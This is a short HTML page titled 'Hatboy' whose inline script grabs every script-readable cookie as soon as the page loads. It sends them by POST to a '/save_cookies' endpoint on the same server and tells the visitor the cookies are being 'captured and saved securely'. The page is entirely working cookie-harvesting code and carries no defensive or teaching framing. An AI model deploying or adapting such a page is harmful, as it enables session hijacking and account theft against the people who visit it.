<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hatboy</title>
    <script>
        // Capture all cookies from the current site
        function captureCookies() {
            const cookies = document.cookie;

            // Send cookies to the server
            fetch("/save_cookies", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cookies: cookies })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message); // Show success message
                console.log("Cookies saved successfully:", data);
            })
            .catch(error => console.error("Error saving cookies:", error));
        }

        // Initialize on page load
        window.onload = () => {
            captureCookies(); // Automatically capture cookies upon loading the page
        };
    </script>
</head>
<body>
    <h1>Welcome</h1>
    <p>Your cookies are being captured and saved securely.</p>
</body>
</html>
